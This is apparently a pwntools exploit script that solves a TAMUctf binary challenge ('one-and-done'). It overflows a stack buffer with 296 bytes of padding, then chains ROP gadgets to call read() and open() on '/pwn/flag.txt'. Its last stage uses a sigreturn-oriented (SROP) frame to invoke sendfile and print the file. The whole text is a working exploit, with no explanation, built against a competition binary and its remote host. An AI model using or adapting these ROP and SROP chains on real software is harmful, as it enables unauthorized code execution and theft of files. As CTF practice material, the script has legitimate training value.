from pwn import *
import time

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x401d89
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="one-and-done")
    else:
        return process(e.path)

p = start()

pop_rax = r.find_gadget(['pop rax','ret'])[0]
pop_rdi = r.find_gadget(['pop rdi','ret'])[0]
pop_rsi = r.find_gadget(['pop rsi','ret'])[0]
pop_rdx = r.find_gadget(['pop rdx','ret'])[0]

syscall_ret = 0x401d89 
writeable_mem = 0x4053d8


def pause():
    time.sleep(1)

def rop_read():
    '''call read(rdi=0x0,rsi=writeable_mem,rdx=0x20)'''
    chain = p64(pop_rax)
    chain += p64(constants.SYS_read)
    chain += p64(pop_rdi)
    chain += p64(0x0)
    chain += p64(pop_rsi)
    chain += p64(writeable_mem)
    chain += p64(pop_rdx)
    chain += p64(0x20)
    chain += p64(syscall_ret)    
    chain += p64(e.sym['main'])
    return chain

def rop_open():
    ''' call open(rdi=writeable_mem, rsi=0x0, rdx=0x0)'''
    chain = p64(pop_rax)
    chain += p64(constants.SYS_open)
    chain += p64(pop_rdi)
    chain += p64(writeable_mem)
    chain += p64(pop_rsi)
    chain += p64(0x0)
    chain += p64(pop_rdx)
    chain += p64(0x0)
    chain += p64(syscall_ret)
    chain += p64(e.sym['main']) 
    return chain

def srop_sendfile():
    '''call sendfile(rdi=0x1, rsi=0x3, rdx=0x0, r10=0x7fffffff)'''
    chain = p64(pop_rax)
    chain += p64(0xf)
    chain += p64(syscall_ret)

    frame = SigreturnFrame(arch="amd64", kernel="amd64")
    frame.rax = constants.SYS_sendfile
    frame.rdi = 0x1
    frame.rsi = 0x3 # fd is static
    frame.rdx = 0x0
    frame.r10 = 0x7fffffff
    frame.rip = syscall_ret

    return chain+bytes(frame)

pad = cyclic(296)

def sys_read():
   p.recvuntil(b"pwn me pls")
   log.info("Sending Stage1: ROP Read()")
   p.sendline(pad+rop_read())

def pwn_flag():
   pause()
   log.info("Sending Bytes: /pwn/flag.txt\\0")
   p.sendline(b"/pwn/flag.txt\0")

def sys_open():
   pause()
   log.info("Sending Stage2: ROP Open()")
   p.sendline(pad+rop_open())

def sys_sendfile():
   pause()
   log.info("Sending Stage3: SROP SendFile")
   p.sendline(pad+srop_sendfile())

sys_read()
pwn_flag()
sys_open()
sys_sendfile()

p.interactive()



